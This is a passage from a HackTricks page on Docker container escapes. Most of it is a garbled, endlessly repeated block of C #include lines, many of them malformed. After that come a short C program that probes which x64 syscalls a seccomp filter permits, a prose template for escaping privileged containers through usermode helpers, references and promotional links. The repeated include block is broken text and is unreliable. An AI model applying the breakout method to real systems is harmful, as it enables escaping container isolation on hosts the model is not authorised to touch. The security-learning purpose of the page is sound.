#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
